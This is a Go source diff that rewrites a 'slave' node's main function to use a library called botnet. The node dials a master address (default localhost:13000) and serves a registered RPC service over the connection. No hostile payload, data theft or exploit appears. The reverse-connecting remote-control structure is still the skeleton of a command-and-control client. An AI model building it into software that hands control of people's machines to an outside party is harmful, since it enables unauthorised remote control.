@@ -3,45 +3,26 @@ package main
 
 import (
 	"flag"
+	"io"
 	"log"
 	"net"
-	"net/rpc"
-	"time"
+
+	"github.com/jncornett/botnet"
 )
 
 const (
-	defaultMaster          = "localhost:13000"
-	defaultConnectInterval = 10 * time.Second
+	defaultMaster = "localhost:13000"
 )
 
 func main() {
 	var (
-		master          = flag.String("master", defaultMaster, "master node")
-		connectInterval = flag.Duration("interval", defaultConnectInterval, "interval to attempt connecting to master")
+		master = flag.String("master", defaultMaster, "master node")
 	)
 	flag.Parse()
 	service := Service{}
-	server := rpc.NewServer()
-	server.Register(&service)
-	for {
-		func() {
-			conn := connect(*connectInterval, *master)
-			defer conn.Close()
-			server.ServeConn(conn)
-		}()
-	}
-}
-
-func connect(interval time.Duration, addr string) net.Conn {
-	for {
-		conn, err := net.Dial("tcp", addr)
-		if err != nil {
-			log.Print(err)
-		} else {
-			return conn
-		}
-		time.Sleep(interval)
-	}
+	slave := botnet.NewSlave(nil)
+	slave.Register(&service)
+	slave.Serve(func() (io.ReadWriteCloser, error) { return net.Dial("tcp", *master) })
 }
 
 type Service struct {
